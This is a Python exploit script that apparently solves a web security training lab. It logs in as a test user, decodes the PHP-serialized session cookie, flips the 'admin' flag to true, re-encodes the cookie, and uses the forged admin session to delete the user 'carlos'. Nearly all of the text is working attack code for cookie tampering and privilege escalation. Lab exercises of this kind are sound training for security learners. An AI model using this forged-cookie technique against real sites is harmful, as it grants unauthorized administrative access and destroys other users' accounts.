#!/usr/bin/env python3
import requests
import sys
import time
import base64
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if token:
        return token["value"]
    return None


def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
    r = s.post(login_page, data=data, verify=False, proxies=proxies, timeout=10)
    if f"Your username is: {username}" in r.text:
        return True
    print(f"[-] Login response snippet: {r.text[:300]}")
    return False


def forge_admin_cookie(cookie):
    decoded = base64.b64decode(requests.utils.unquote(cookie)).decode()
    print(f"[+] Original cookie content: {decoded}")
    new_cookie = decoded.replace('s:5:"admin";b:0;', 's:5:"admin";b:1;')
    print(f"[+] New cookie content: {new_cookie}")
    encoded = requests.utils.quote(base64.b64encode(new_cookie.encode()))
    return encoded


def delete_carlos(s, url):
    r = s.get(url + "/admin/delete?username=carlos", verify=False, allow_redirects=False, proxies=proxies, timeout=10)
    return r.status_code == 302


def check_solved(s, url, retries=5, delay=1.5):
    for attempt in range(retries):
        r = s.get(url + "/", verify=False, proxies=proxies, timeout=10)
        if 'Congratulations' in r.text:
            print("[+] Lab solved!")
            return True
        if attempt < retries - 1:
            time.sleep(delay)
    print("[-] Lab not solved yet")
    return False


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return False
    print("[+] Logged in as wiener")

    session_cookie = s.cookies.get("session")
    if not session_cookie:
        print("[-] No session cookie found after login")
        return False

    forged = forge_admin_cookie(session_cookie)
    if not forged:
        print("[-] Failed to forge admin cookie")
        return False
    s.cookies.set("session", forged)
    print("[+] Forged admin cookie")

    if not delete_carlos(s, url):
        print("[-] Failed to delete carlos")
        return False
    print("[+] Deleted carlos")

    check_solved(s, url)


if __name__ == "__main__":
    main()